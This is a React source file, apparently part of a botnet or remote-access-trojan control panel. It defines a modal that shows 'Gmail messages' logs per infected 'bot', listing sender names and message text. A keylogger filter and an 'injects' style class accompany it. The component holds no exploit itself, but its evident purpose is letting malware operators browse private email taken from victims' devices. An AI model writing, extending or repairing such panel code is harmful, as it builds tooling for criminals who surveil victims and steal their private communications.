import React, {useLayoutEffect, useRef} from "react";
import {ModalsProps} from "../../../Model/Modal";
import {Button, Modal, Table} from "antd";
import {Bot} from "../../../Model/Bot";
import {useDispatch, useSelector} from "react-redux";
import {AppState} from "../../../Store/RootReducer";
import {getLogsList} from "../../../Store/Logs/Actions";

interface GmailMessagessLog {
    list: string,
    upper_date: string,
    sender_name: string,
}

interface GmailMessagessProps extends ModalsProps {
    bot: Bot,
}

const GmailMessagess: React.FC<GmailMessagessProps> = (props: GmailMessagessProps) => {
    const dispatch = useDispatch();
    const logsReducer = useSelector((state: AppState) => state.logs);
    const tableRef = useRef<HTMLDivElement>(null);

    useLayoutEffect(() => {
        if (props.visible) {
            dispatch(getLogsList("gmail_messages", props.bot.id, null, logsReducer.filters, logsReducer.sort, logsReducer.page, logsReducer.per_page, {
                keyloggerAction: logsReducer.filters.keyloggerAction,
            }));
        }
    }, [dispatch, props.bot.id, props.visible, logsReducer.page, logsReducer.per_page, logsReducer.filters.keyloggerAction]);


    const closeModal = () => {
        props.setVisible(false);
    };

    const columns = [
        {
            title: "Sender name",
            dataIndex: "sender_name",
            key: "sender_name",
            render: (text: string, log: GmailMessagessLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>Sender name</b>
                    </div>
                    <div className="table-col-item">
                        {log.sender_name}
                    </div>
                </div>
            ),
        },
        {
            title: "Text",
            dataIndex: "list",
            key: "list",
            render: (text: string, log: GmailMessagessLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>Text</b>
                    </div>
                    <div className="table-col-item">
                        {log.list}
                    </div>
                </div>
            ),
        },
        {
            title: "Upper date",
            dataIndex: "upper_date",
            key: "upper_date",
            render: (text: string, log: GmailMessagessLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>Upper date</b>
                    </div>
                    <div className="table-col-item">
                        {log.upper_date}
                    </div>
                </div>
            ),
        },
    ];

    let dataSource: GmailMessagessLog[];

    if (logsReducer.logs.length > 0) {
        dataSource = (logsReducer.logs[0].log) as unknown as GmailMessagessLog[];
    } else {
        dataSource = [];
    }

    const isLoaded = logsReducer.isLoaded && logsReducer.type === "gmail_messages" && logsReducer.botId === props.bot.id;

    return (
        <Modal
            title="GmailMessagess logs"
            className="modal-injects"
            visible={props.visible}
            onCancel={closeModal}
            width={600}
            destroyOnClose
            footer={[
                <>

                    <Button
                        type="primary"
                        onClick={closeModal}
                        danger
                    >
                        Close
                    </Button>
                </>,
            ]}
        >
            <div className="table-scroll" style={{maxHeight: 600, overflowY: "auto"}} ref={tableRef}>
                <Table
                    columns={columns}
                    dataSource={isLoaded ? dataSource : []}
                    size="small"
                    pagination={false}
                    sticky={true}
                    className="not-responsive"
                    loading={!isLoaded}
                />
            </div>
        </Modal>
    );
};

export default GmailMessagess;
